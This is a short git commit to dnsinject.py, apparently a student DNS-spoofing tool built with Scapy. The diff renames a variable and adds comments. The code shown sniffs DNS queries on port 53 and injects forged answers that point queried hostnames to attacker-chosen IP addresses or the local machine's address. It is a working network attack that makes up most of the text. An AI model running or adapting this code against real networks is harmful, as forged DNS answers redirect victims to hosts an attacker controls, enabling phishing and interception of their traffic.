d4dc96b49d1fab3f6bef84a66de1c56ecfb6421e
dylsugar <dylansuga@gmail.com>
2021-03-23 20:39:24 -0400

    last one

--- dnsinject.py
+++ dnsinject.py
@@ -20,9 +20,10 @@ def inject_packet(pkt):
                 inmap = True
                 newqname = e
 
+        print("Found Query Hostname: ",newqname)
         if hostnames_there and inmap: #matches with a host from hostnames
-            poison_addr = dns_holder[newqname]
-            print("Conjuring Spoof Packet with ip --->",poison_addr)
+            spoofip = dns_holder[newqname]
+            print("Conjuring Spoof Packet with ip --->",spoofip)
         else:#use local machine ip
             spoofip = addr
         inject_packet = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id,qd=query,qr=1,aa=0,rcode=0, an=DNSRR(rrname=query.qname,ttl=350, rdata=spoofip))
@@ -31,9 +32,9 @@ def inject_packet(pkt):
 
 def main():
     global interface, addr, hostnames_there
-    interface = ni.gateways()['default'][ni.AF_INET][1]
-    addr = ni.ifaddresses(str(interface))[ni.AF_INET][0]['addr']
-    command = sys.argv
+    interface = ni.gateways()['default'][ni.AF_INET][1] #default interface
+    addr = ni.ifaddresses(str(interface))[ni.AF_INET][0]['addr'] #default ip address
+    command = sys.argv #command line 
     if "-h" in command:
         hostnamefile = command[command.index("-h")+1]
         hostnames_there = True
@@ -43,9 +44,9 @@ def main():
 
     if hostnames_there:
         hf = open(hostnamefile, "r")
-        for line in hf:
+        for line in hf: #insert key pair
             ip_host = line.split(',')
-            dns_holder[ip_host[1].strip() + "."] = str(ip_host[0]).strip()
+            dns_holder[ip_host[1].strip()+"."] = str(ip_host[0]).strip()
     print("Current Interface: "+str(interface))
     print("Sniffing has begun...")
     sniff(iface = interface,filter = 'port 53', prn = inject_packet, store = 0)
